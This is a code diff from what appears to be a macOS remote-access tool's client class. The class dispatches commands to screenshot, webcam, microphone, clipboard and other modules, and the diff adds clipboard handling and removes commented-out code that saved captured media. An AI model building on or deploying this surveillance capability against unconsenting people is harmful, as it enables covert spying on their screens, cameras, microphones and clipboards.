@@ -80,27 +80,12 @@ class reMac_libclient(reMac_libbase):
         if action.startswith("mh")\
                 or action == "in":
             return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
-            # print(content.get("result"))
+        elif action.startswith("cb"):
+            return self.reMacModules["cb"][0].run_mod(content)
         elif action.startswith("sc"):
             return self.reMacModules["sc"][0].run_mod(content)
-            # print(content.get("result"))
-            # cur_dir = os.path.abspath("./tmp")
-            # base64ToolContent = content.get("result")
-            # base64ToolContent = base64ToolContent.encode()
-            # audio_out = f"{cur_dir}/screenshot-{self.get_datetime_str()}.png"
-            # with open(audio_out, "wb") as output_file:
-            #     output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("wc"):
             return self.reMacModules["wc"][0].run_mod(content)
-            # print(content.get("result"))
-            # cur_dir = os.path.abspath("./tmp")
-            # print("CurDir: " + cur_dir)
-            # base64ToolContent = content.get("result")
-            # base64ToolContent = base64ToolContent.encode()
-            #
-            # image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"
-            # with open(image_out, "wb") as output_file:
-            #     output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("rm"):
             return self.reMacModules["rm"][0].run_mod(content)
         elif action.startswith("cl"):
@@ -109,15 +94,6 @@ class reMac_libclient(reMac_libbase):
             return self.reMacModules["ch"][0].run_mod(content)
         elif action.startswith("hw"):
             return self.reMacModules["hw"][0].run_mod(content)
-        # elif action.startswith("hw"):
-        #     return self.reMacModules["hw"][0].run_mod(content)
-            # print(content.get("result"))
-            # cur_dir = os.path.abspath("./tmp")
-            # base64ToolContent = content.get("result")
-            # base64ToolContent = base64ToolContent.encode()
-            # audio_out = f"{cur_dir}/recmic-{self.get_datetime_str()}.mp3"
-            # with open(audio_out, "wb") as output_file:
-            #     output_file.write(base64.b64decode(base64ToolContent))
         else:
             print(f"got result: {result}, action: {action}")
 
